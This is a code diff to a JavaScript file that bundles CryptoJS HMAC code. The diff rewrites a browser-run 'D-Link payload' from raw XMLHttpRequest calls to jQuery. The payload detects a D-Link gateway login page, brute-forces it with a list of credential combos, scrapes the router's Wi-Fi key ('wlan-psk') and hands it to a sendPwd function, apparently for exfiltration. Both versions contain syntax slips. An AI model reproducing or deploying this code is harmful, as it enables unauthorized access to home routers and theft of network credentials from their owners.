@@ -10,64 +10,34 @@ g=8*e.sigBytes;f[g>>>5]|=128<<24-g%32;f[(g+64>>>9<<4)+15]=b;e.sigBytes=4*f.lengt
 (function(){var h=CryptoJS,i=h.enc.Utf8;h.algo.HMAC=h.lib.Base.extend({init:function(e,f){e=this._hasher=e.create();"string"==typeof f&&(f=i.parse(f));var h=e.blockSize,k=4*h;f.sigBytes>k&&(f=e.finalize(f));for(var o=this._oKey=f.clone(),m=this._iKey=f.clone(),q=o.words,r=m.words,b=0;b<h;b++)q[b]^=1549556828,r[b]^=909522486;o.sigBytes=m.sigBytes=k;this.reset()},reset:function(){var e=this._hasher;e.reset();e.update(this._iKey)},update:function(e){this._hasher.update(e);return this},finalize:function(e){var f=
 this._hasher,e=f.finalize(e);f.reset();return f.finalize(this._oKey.clone().concat(e))}})})();
 
-
 // check if this is the dlink
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://'+window.location.hostname+'/ui/login', true);
-xhr.onload = function () {
-      if(this.response.includes("D-LINK")){
-      	console.log("d-link");
-      	dlinkStart();
-      }
-      
-      };
-xhr.responseType = 'text'
-xhr.send(null);
-
-
-
-function dlinkStart(){
-	// Residential Gateway - D-Link payload
-	function dlinkAttacker(user, passwd) {
-	  // first request to get the nonce and code1
-	  var xhr = new XMLHttpRequest();
-	  xhr.open('GET', 'http://'+window.location.hostname+'/ui/login', true);
-	  xhr.onload = function () {
-	    // Request finished. Do processing here.
-	    if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
-	        var username = user
-	        var pwd = passwd
-	        var nonce = xhr.response.form.nonce.value
-	        var code1 = xhr.response.form.code1.value
-	        var encPwd = CryptoJS.HmacSHA256(pwd, nonce)
-	        var xhr2 = new XMLHttpRequest();
-	        xhr2.open('POST', 'http://'+window.location.hostname'+/ui/login', true);
-	        //Send the proper header information along with the request
-	        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-	        xhr2.onreadystatechange = function () { //Call a function when the state changes.
-	          if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
-	            try {
-	              var wlanPsk = xhr2.response.getElementById('wlan-psk').innerHTML
-		      			// get password
-								sendPwd(wlanPsk);
-	              console.log(wlanPsk)
-	            } catch (e) {
-	              // wrong password
-	              console.log('Error: ' + username + ' - ' + pwd)
-	              i++
-	              dlinkAttacker(combos[i].user, combos[i].pwd)
-	            }
-	          }
-	        }
-	        var params = 'userName=' + username + '&language=IT&login=Login&userPwd=' + encPwd + '&nonce=' + nonce + '&code1=' + code1
-	        xhr2.responseType = 'document'
-	        xhr2.send(params);
-	    } 
-	  };
-	  xhr.responseType = 'document'
-	  xhr.send(null);
+$.get( "http://"+window.location.hostname+"/ui/login", function( data ) {
+  if(data.includes("D-LINK")){
+		console.log("d-link");
+		dLinkStart(data);
 	}
-	
-	dlinkAttacker(combos[i].user, combos[i].pwd)
-}
+});
 
+
+function dLinkStart(data){
+	// get nonce and code1 from data
+	var nonce = $(data).find("input[name=nonce]").val();
+	var code1 = $(data).find("input[name=code1]").val();
+	var j = 0;
+
+	for (j = 0; j < combos.length; j++) {
+		var username = combos[j].user;
+		var password = combos[j].pwd;
+	  var encPwd = CryptoJS.HmacSHA256(password, nonce)
+		var params = {"userName":username,"login":"Login","userPwd":encPwd,"nonce":nonce,"code1":code1};
+		$.post( "http://"+window.location.hostname+"/ui/login",params,  function( data ) {
+			if(data.includes("wlan-psk")){
+				//yeah
+				wlanPsk = $(data).find("#wlan-psk")[0]innerHTML;
+				sendPwd(wlanPsk);
+				console.log(wlanPsk);
+				return;
+			}
+		});
+	}
+}
